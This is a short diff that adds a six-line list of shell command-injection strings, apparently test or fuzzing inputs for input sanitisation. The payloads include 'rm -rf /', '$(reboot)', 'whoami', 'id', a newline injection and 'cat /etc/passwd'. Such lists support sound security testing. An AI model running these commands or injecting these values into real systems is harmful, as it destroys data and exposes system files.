@@ -1,0 +1,6 @@
+;rm -rf /
+&& whoami
+$(reboot)
+`id`
+arg%0anewline
+| cat /etc/passwd
